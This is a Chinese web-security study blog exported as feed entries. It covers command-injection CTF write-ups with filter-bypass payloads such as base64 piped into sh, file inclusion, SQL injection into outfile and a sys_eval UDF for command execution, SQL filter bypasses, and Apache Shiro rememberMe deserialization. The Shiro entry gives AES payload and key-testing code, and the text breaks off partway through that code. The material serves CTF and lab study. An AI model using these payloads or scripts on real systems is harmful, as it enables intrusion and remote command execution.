<p>&amp;&amp;  前面的语句为真时，才执行后面的语句。如ping<br>-c 4 127.0.0.1 &amp;&amp; whoami</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>buuctf: [ACTF2020 新生赛]Exec</p>
<p><img src="/assets/image-20230611125831-wyd811s.png" alt="image.png"></p>
<p><img src="/assets/image-20230611130159-pejc8lx.png" alt="image.png"></p>
<p>输入123| ls，查看一下当前目录下的文件。</p>
<p><img src="/assets/image-20230611130301-80s6si2.png" alt="image.png"></p>
<p>只有一个index.php文件，我们再查看一下根目录下的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">123 | <span class="built_in">ls</span> /</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20230611130359-yoc17e5.png" alt="image.png"></p>
<p>利用cat命令查看flag中的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">123 | <span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20230611130535-e51xqpj.png" alt="image.png"></p>
<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$1flag</span>  //<span class="variable">$1</span>改成$加其他数字貌似都行</span><br><span class="line">&#123;<span class="built_in">cat</span>,flag&#125;</span><br><span class="line"><span class="built_in">cat</span>&lt;flag</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag</span><br><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">%20 </span><br><span class="line">%09 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h1><p>变量拼接</p>
<p><img src="/assets/image-20230611133442-8lhlnrs.png" alt="image.png"></p>
<p>反引号</p>
<p><img src="/assets/image-20230611142830-4e3mxuo.png" alt="image.png"></p>
<p>反斜杠</p>
<p><img src="/assets/image-20230611143949-1ti3kru.png" alt="image.png"></p>
<p>引号</p>
<p><img src="/assets/image-20230611144924-yo0kp30.png" alt="image.png"></p>
<p>编码绕过</p>
<p>base64编码cat flag</p>
<p><img src="/assets/image-20230611145308-1izstw5.png" alt="image.png"></p>
<h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><h2 id="buuctf-GXYCTF2019-PingPing-Ping"><a href="#buuctf-GXYCTF2019-PingPing-Ping" class="headerlink" title="buuctf:  [GXYCTF2019]PingPing Ping"></a>buuctf:  [GXYCTF2019]PingPing Ping</h2><p><img src="/assets/image-20230611150842-yukxdr4.png" alt="image.png"></p>
<p><img src="/assets/image-20230611150853-75xulfj.png" alt="image.png"></p>
<p>这个题目的标题是pingping盲猜是关于命令执行的题目.</p>
<p>给ip参数传参：&#x2F;?ip&#x3D;127.0.0.1;ls</p>
<p><img src="/assets/image-20230611151223-ir4jtg6.png" alt="image.png"></p>
<p>发现同级目录下的两个文件，我们输入?ip&#x3D;127.0.0.1;cat flag.php.</p>
<p><img src="/assets/image-20230611151427-u1i1cfo.png" alt="image.png"></p>
<p>并未执行成功，猜测可能是把空格过滤掉了。我们替换空格。（例如:<code>$IFS$</code>1 ）</p>
<p><img src="/assets/image-20230611151620-l2v4euk.png" alt="image.png"></p>
<p>发现仍未执行成功，可能将flag字符过滤掉了，但具体怎样过滤的我们还不确定，我们转换思路，查看index.php的内容。</p>
<p><img src="/assets/image-20230611151733-c5yysqr.png" alt="image.png"></p>
<p>成功查看到index的内容。</p>
<p>这段代码是一个PHP脚本，看起来是一个简单的IP地址的ping测试。让我逐行解释其含义：<br><strong>&#x2F;?ip&#x3D;</strong><br>这行代码是一个URL路径，表示在根目录下的ip参数。也就是说，该脚本期望通过GET请求将IP地址作为参数传递给它。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match)</span></span><br><span class="line"><span class="string">这行代码使用正则表达式检查IP地址参数是否包含一些特殊字符。如果匹配到这些特殊字符，将会执行下面的代码块。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码使用正则表达式检查IP地址参数中是否包含一些特殊符号，如&amp;、&#x2F;、?、*、&lt;等。如果匹配到这些符号，将输出”fxck your symbol!”并终止脚本执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码检查IP地址参数是否包含空格。如果包含空格，将输出”fxck your space!”并终止脚本执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码检查IP地址参数是否包含”bash”字符串。如果包含，将输出”fxck your bash!”并终止脚本执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码使用正则表达式检查IP地址参数是否包含”f”, “l”, “a”, “g”字符序列（无论字符之间是否有其他字符）。如果匹配到这个字符序列，将输出”fxck your flag!”并终止脚本执行。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段代码使用shell_exec函数执行一个ping命令，向指定的IP地址发送4个回声请求。然后将ping命令的输出打印出来。&#96;</p>
<p>总结来说，这段代码对传入的IP地址参数进行了一系列的检查，包括特殊字符、空格、”bash”字符串和特定字符序列。如果检查失败，将输出相应的错误信息并终止脚本执行。如果检查通过，将执行ping命令并打印其输出。</p>
<p>base64编码绕过：<code>http://e7d31689-f496-4351-93df-bced5d941928.node4.buuoj.cn:81/?ip=127.0.0.1;echo1Y2F0IGZsYWcucGhw|base641-d|sh$IFS$$IFS$</code></p>
<p>我们可以利用变量拼接字符绕过，以达到执行cat flag.php的目的。</p>
<p><img src="/assets/image-20230611152448-6lijcbr.png" alt="image.png"></p>
<p>查看源代码：</p>
<p><img src="/assets/image-20230611152617-4f1gtlf.png" alt="image.png"></p>
<p>得到flag。</p>
<p>经验：</p>
<p>多次尝试不同方式的字符绕过，以及连接符（比如：|或;或者&amp;&amp;）。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h1 id="一，概述"><a href="#一，概述" class="headerlink" title="一，概述"></a>一，概述</h1><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被成为文件包含。其中PHP的文件包含是通过include()、require()、include_once()和require_once()四个函数实现的。</p>
<table>
<thead>
<tr>
<th>函 数</th>
<th>包含失败</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>include()</td>
<td>返回一条警告</td>
<td>报错也会继续运行</td>
</tr>
<tr>
<td>require()</td>
<td>强行中断</td>
<td>代码在报错处不再运行</td>
</tr>
<tr>
<td>include_once()</td>
<td>返回一条警告</td>
<td>除了原有include()功能，还会做once检测，如果文件曾经已经被包含过，不在包含</td>
</tr>
<tr>
<td>require_once()</td>
<td>强行中断</td>
<td>除了原有require()功能，还会做once检测,防止文件反复包含<br /></td>
</tr>
</tbody></table>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p><img src="/assets/image-20230611162932-h57hl9f.png" alt="image.png"></p>
<p><img src="/assets/image-20230611162938-tdwrth7.png" alt="image.png"></p>
<h1 id="例题：buuctf-BUU-LFI-COURSE-1"><a href="#例题：buuctf-BUU-LFI-COURSE-1" class="headerlink" title="例题：buuctf: BUU LFI COURSE 1"></a>例题：buuctf: BUU LFI COURSE 1</h1><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。在本题的PHP代码中即可看到include函数<br>因为文件路径可控，当输入系统的密码文件所在路径时，内容会输出出来<br>在url后构造</p>
<blockquote>
<p>?file&#x3D;&#x2F;flag</p>
</blockquote>
<p><img src="/assets/image-20230611223332-x57am5z.png" alt="image.png"></p>
<h3 id="还可以加一些不存在的目录名，进行穿越、绕过"><a href="#还可以加一些不存在的目录名，进行穿越、绕过" class="headerlink" title="还可以加一些不存在的目录名，进行穿越、绕过"></a>还可以加一些不存在的目录名，进行穿越、绕过</h3><p>加入一个不存在的目录名，然后利用..&#x2F;返回上级目录继续操作即可。</p>
<hr>
<p><img src="/assets/image-20230611223826-wjcu8mv.png" alt="image.png"></p>
<h2 id="通过php-查看源代码"><a href="#通过php-查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;查看源代码"></a>通过php:&#x2F;&#x2F;查看源代码</h2><h2 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;<img src="/"></h2><h2 id="php-data"><a href="#php-data" class="headerlink" title="php:data:&#x2F;&#x2F;"></a>php:data:&#x2F;&#x2F;</h2>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/assets/</url>
    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="SQL注入之命令执行"><a href="#SQL注入之命令执行" class="headerlink" title="SQL注入之命令执行"></a>SQL注入之命令执行</h1><p>​<img src="/assets/image-20230929220301-q2rkffq.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929221850-zp3nc5q.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929221930-t4ta1ll.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929222222-2e6kdc4.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span>;</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">| <span class="built_in">id</span> | login | password | secret |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line">|  <span class="number">1</span> | <span class="number">2</span>     | <span class="number">3</span>        | <span class="number">4</span>      |</span><br><span class="line">+----+-------+----------+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1086</span> (HY000): File <span class="string">&#x27;/var/www/html/&#x27;</span> already exists</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/abc.txt&#x27;</span>;</span><br><span class="line">ERROR <span class="number">1</span> (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/var/www/html/abc.txt<span class="string">&#x27; (Errcode: 13)</span></span><br><span class="line"><span class="string">mysql&gt; </span></span><br></pre></td></tr></table></figure>

<p>找到有写权限的文件夹。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mysql&gt; use bWAPP;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table <span class="keyword">and</span> column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> heroes where <span class="built_in">id</span> = <span class="number">7</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;hello&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/images/abc.php&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">1</span> row affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>​<img src="/assets/image-20230929223031-0y9r1kb.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929223018-4ltxznq.png" alt="image"></p>
<p>​​<img src="/assets/image-20230929223317-hoszwjl.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004200527-5oew64i.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004200543-b53cym0.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004200739-k7afew9.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004201846-woehgms.png" alt="image"></p>
<p>剔除回车</p>
<p>tr -d ‘\n’ &lt; input.txt &gt; output.txt​</p>
<p>​<img src="/assets/image-20231004202619-mwbcoga.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004202813-jqg4kd8.png" alt="image">​</p>
<p>成功写入。</p>
<p>创建自定义函数。</p>
<p>​<img src="/assets/image-20231004202940-0u8nkmq.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname <span class="string">&quot;lib_linux1.so&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20231004204816-7dyad18.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004204847-iqrgc5l.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004204911-vr8djbp.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004204944-o1zialm.png" alt="image"></p>
<p>​</p>
<h2 id="用户和组的概念"><a href="#用户和组的概念" class="headerlink" title="用户和组的概念"></a>用户和组的概念</h2><p>​<img src="/assets/image-20231004230229-9qfa4m0.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230309-b61lag4.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230400-u38bj2h.png" alt="image"></p>
<p>​​<img src="/assets/image-20231004230437-96at58h.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230522-04vylgc.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230558-4ttxdtt.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230612-hai1k6e.png" alt="image">​</p>
<p>​<img src="/assets/image-20231004230646-vmtl41l.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5/%E6%B7%B7%E6%B7%86%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="混淆注入"><a href="#混淆注入" class="headerlink" title="混淆注入"></a>混淆注入</h1><h2 id="1-定义和原理"><a href="#1-定义和原理" class="headerlink" title="1.定义和原理"></a>1.定义和原理</h2><p>​<img src="/assets/image-20230928163137-st1icap.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928163225-cfhi8nn.png" alt="image">​</p>
<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h2><p>​<img src="/assets/image-20230928165435-0x254vi.png" alt="image">​</p>
<p>过滤掉了union。</p>
<p>大小写绕过。</p>
<p>​<img src="/assets/image-20230928165950-dje05y4.png" alt="image">​</p>
<h2 id="3-和-和union和where和limit绕过"><a href="#3-和-和union和where和limit绕过" class="headerlink" title="3.||和&amp;&amp;和union和where和limit绕过"></a>3.||和&amp;&amp;和union和where和limit绕过</h2><p>​<img src="/assets/image-20230928170426-3xmz4sg.png" alt="image">​</p>
<p>前后的&#x2F;表示开头和结尾，第二个&#x2F;后面的i表示对大小写不敏感。</p>
<p>​<img src="/assets/image-20230928170740-tzwj107.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929165746-l8lo9h8.png" alt="image"></p>
<p>​<img src="/assets/image-20230929170453-7r1zvj9.png" alt="image">​​</p>
<p>​<img src="/assets/image-20230929165822-z0wicgg.png" alt="image"></p>
<p>可用limit 1,1进行绕过。</p>
<p>​<img src="/assets/image-20230929170751-0fe5the.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929171015-55d3miy.png" alt="image">​</p>
<h2 id="4-绕过groupby-select-单引号-hex-unhex-substr"><a href="#4-绕过groupby-select-单引号-hex-unhex-substr" class="headerlink" title="4.绕过groupby,select,单引号,hex,unhex,substr"></a>4.绕过groupby,select,单引号,hex,unhex,substr</h2><p>​<img src="/assets/image-20230929171517-aclz6x9.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929171802-u8npuk2.png" alt="image"></p>
<p>​​<img src="/assets/image-20230929172113-zprcrg9.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929171912-sykrv5o.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929172238-pjrnsuv.png" alt="image">​</p>
<p>​​<img src="/assets/image-20230929192504-8pmu3gf.png" alt="image">​</p>
<p>​​<img src="/assets/image-20230929193335-s693d2l.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929193419-5q1ec6f.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929193542-g65par1.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929194323-xip1yr0.png" alt="image">​</p>
<h2 id="5-绕过空格，等号，双写，双重编码"><a href="#5-绕过空格，等号，双写，双重编码" class="headerlink" title="5.绕过空格，等号，双写，双重编码"></a>5.绕过空格，等号，双写，双重编码</h2><p>​<img src="/assets/image-20230929194421-2iix6py.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929194642-gtv0y5y.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929194810-rfw6gk3.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929194926-gatkys5.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929194951-ttjiisr.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929195042-gt2ne0q.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929195117-0bwtu75.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929195335-d84jfdc.png" alt="image">​</p>
<h2 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h2><p>​<img src="/assets/image-20230929200502-evtim0e.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929201445-jjmwund.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8011</span>/sqli-labs-master/Less-<span class="number">36</span>/?<span class="built_in">id</span>=<span class="number">1123</span> %df%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230929201623-98dgjv2.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929201651-x91351z.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929201731-5xwmf0c.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929201807-5fd8095.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929201858-31o99zi.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929204034-fabvv0e.png" alt="image">​</p>
<h2 id="7-二次注入"><a href="#7-二次注入" class="headerlink" title="7.二次注入"></a>7.二次注入</h2><p>​<img src="/assets/image-20230929210937-3uwi6xc.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929215939-5jupz81.png" alt="image">​</p>
<p>构造恶意用户名，当登录上刚刚注册的账户后，可以修改自己的密码，但是由于’#的闭合以及注释作用，直接可以修改admin的密码。</p>
<p>​<img src="/assets/image-20230929215812-edri7nl.png" alt="image">​</p>
<p>​<img src="/assets/image-20230929215752-rpzexyo.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多。</p>
<h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>kali-2021 攻击机 192.168.8.9</p>
<p>docker vulhub 192.168.8.6</p>
<p>vulhub</p>
<p>cd &#x2F;vulhub&#x2F;shiro&#x2F;CVE-2016-4437</p>
<p>docker-compose up -d</p>
<h2 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h2><p> Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
<p>‍</p>
<p>1.首先正常登录，然后生成带有rememberme的返回cookie值。</p>
<p>2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager</p>
<p>3.之后进入serialize，对登录认证信息进行序列化</p>
<p>4.然后加密，调用aes算法。</p>
<p>5.加密结束，然后在在org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回</p>
<p>6.解析cookie</p>
<p>7.先解密在反序列化</p>
<p>8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码</p>
<p>9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager这里用的是默认反序列化类,然后触发生成反序列化。</p>
<p>Shiro 1.2.4版本默认固定密钥：</p>
<p>​<img src="/assets/image-20231022163553-92edk5o.png" alt="image">​</p>
<p><strong>Shiro框架默认指纹特征：</strong></p>
<p>1.未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</p>
<p>2.登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe&#x3D;deleteMe字段</p>
<p>3.不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段</p>
<p>4.勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p>
<h2 id="四、AES秘钥"><a href="#四、AES秘钥" class="headerlink" title="四、AES秘钥"></a>四、AES秘钥</h2><p> 在Shiro 1.2.4以及之前的版本中AES加密的秘钥都是默认的编码在代码里的（SHIRO-550），1.2.4以上移除了默认秘钥，需要开发者设置或者默认动态生成，降低了秘钥泄露的风险。</p>
<p> 但是一些开源的项目内部集成了shiro的二次开发，可能会有低版本shiro的默认秘钥的风险，一些用户搭建环境时会使用网上的教程来快速搭建，直接复制了网上的秘钥，从而造成了秘钥的泄密，引发了反序列化漏洞。</p>
<p>可以在github上使用命令</p>
<p>“securityManager.setRememberMeManager(rememberMeManager);Base64.decode(“<br>或<br>“setCipherKey(Base64.decode(”  </p>
<p><strong>1、判断AES秘钥</strong><br> 密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe&#x3D;deleteMe字段，</p>
<p> 而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe&#x3D;deleteMe字段</p>
<p> shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。</p>
<p>在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
<p>‍</p>
<p>CBC算法的shiro生成payload的关键代码如下，也就是我们通用的生成shiro攻击代码</p>
<p> python中有实现aes-cbc的算法，通过指定mode为AES-CBC，遍历key，随机生成iv，配合ysoserial的gadget即可生成payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BS   = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">mode =  AES.MODE_CBC</span><br><span class="line">iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">file_body = pad(file_body)</span><br><span class="line">encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"><span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure>

<p> 而在1.4.2以后由于padding oracle的影响，shiro官方把加密方式改为了GCM，所以我们需要更改脚本，添加GCM下的攻击方式去攻击高版本的shiro，通过跟踪代码动态调试可以看出确实是使用GCM加密</p>
<p> 所以shiro的攻击脚本中的核心代码我们来修改一下,GCM加密不需要padding，但需要一个MAC值(也就是我代码里的tag)，这块可以自己跟一下源码，核心代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)</span><br><span class="line">ciphertext, tag = cipher.encrypt_and_digest(file_body)</span><br><span class="line">ciphertext = ciphertext + tag</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + ciphertext)</span><br><span class="line"><span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure>

<p> 密钥集合我这里简单列举了几个，网上流传大量现成的 Shiro 100 Key(<a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a>)</p>
<p>集合，请自行查找替换。密钥判断脚本如下：</p>
<p>输入目标的url，通过判断返回包是否存在Set-Cookie：rememberMe&#x3D;deleteMe来判断秘钥是否正确</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 